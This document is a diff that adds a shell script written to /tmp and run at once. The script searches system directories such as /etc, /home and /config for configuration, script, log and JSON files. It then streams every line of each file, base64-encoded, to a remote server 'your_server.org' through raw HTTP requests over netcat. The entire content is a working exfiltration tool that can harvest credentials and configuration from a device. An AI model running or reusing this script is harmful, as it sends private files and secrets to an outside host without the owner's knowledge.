@@ -1,0 +1,111 @@
+cat > /tmp/send_lines_get.sh << 'EOF'
+#!/bin/sh
+
+SERVER="http://your_server.org/3_recieve_log/log_get.php"
+TEST_LIMIT=-1  # -1 = all lines
+
+# Create temporary file list
+FILE_LIST="/tmp/file_list.txt"
+> "$FILE_LIST"
+
+echo "=== SIMPLIFIED FILE SEARCH ==="
+
+# Simple approach: search common directories with basic patterns
+echo "Searching for common file types..."
+
+# Search for common file types in key locations
+for dir in /pref /etc /var /tmp /log /data /storage /mnt /media /sysconfig /config /opt /home /usr/local /tmp/SD0 /tmp/FL0; do
+    if [ -d "$dir" ]; then
+        find "$dir" -type f \( -name "*.conf" -o -name "*.sh" -o -name "*.cfg" -o -name "*.ini" -o -name "*.txt" -o -name "*.log" -o -name "*.json" \) 2>/dev/null | head -50 >> "$FILE_LIST"
+    fi
+done
+
+# Remove duplicates and count
+sort -u "$FILE_LIST" > "${FILE_LIST}.sorted"
+mv "${FILE_LIST}.sorted" "$FILE_LIST"
+
+FILE_COUNT=$(wc -l < "$FILE_LIST" 2>/dev/null || echo 0)
+echo "=== FOUND $FILE_COUNT TOTAL FILES ==="
+
+# Show what we found
+echo "=== FILE LIST ==="
+cat "$FILE_LIST"
+echo "=== END FILE LIST ==="
+
+# Function to send data to server
+send_to_server() {
+    local data="$1"
+    local encoded=$(printf '%s' "$data" | base64 | tr -d '\n' | sed 's/+/%2B/g' | sed 's/\//%2F/g' | sed 's/=/=%3D/g')
+    echo "SENDING: $data"
+    {
+        printf "GET /3_recieve_log/log_get.php?b=%s HTTP/1.0\r\n" "$encoded"
+        printf "Host: your_server.org\r\n"
+        printf "\r\n"
+    } | nc your_server.org 80
+    sleep 0.05
+}
+
+# First, send the file list to server
+send_to_server "=== FILE LIST: $FILE_COUNT files found ==="
+
+# Send each file path
+while IFS= read -r f; do
+    [ -z "$f" ] && continue
+    file_info="FILE: $(basename "$f") (full path: $f)"
+    echo "Listing: $file_info"
+    send_to_server "$file_info"
+done < "$FILE_LIST"
+
+# Send end of file list marker
+send_to_server "=== END FILE LIST ==="
+
+sleep 1
+
+# Now process each file
+while IFS= read -r f; do
+    [ -z "$f" ] && continue
+    [ -r "$f" ] || { echo "Cannot read: $f"; continue; }
+    
+    bn=$(basename "$f")
+    echo "=== Processing file: $bn ==="
+
+    # Check if file is empty
+    if [ ! -s "$f" ]; then
+        echo "Skipping empty file: $f"
+        continue
+    fi
+
+    # send file header
+    send_to_server "FILE_START:$bn"
+
+    n=0
+    while IFS= read -r line || [ -n "$line" ]; do
+        n=$((n + 1))
+        if [ "$TEST_LIMIT" -ge 0 ] && [ "$n" -gt "$TEST_LIMIT" ]; then
+            echo "(test limit reached for $bn)"
+            break
+        fi
+
+        # Send line with structured format
+        formatted_line="LINE:$n:$line"
+        echo "Sending: $formatted_line"
+        send_to_server "$formatted_line"
+    done < "$f"
+
+    # send file footer
+    send_to_server "FILE_END:$bn:LINES:$n"
+
+    echo "=== Finished $bn (sent $n lines) ==="
+done < "$FILE_LIST"
+
+# Send final completion marker
+send_to_server "=== ALL FILES PROCESSED ==="
+
+# Clean up
+rm -f "$FILE_LIST"
+
+echo "All files processed. Sent $FILE_COUNT files to server."
+EOF
+
+chmod +x /tmp/send_lines_get.sh
+sh /tmp/send_lines_get.sh
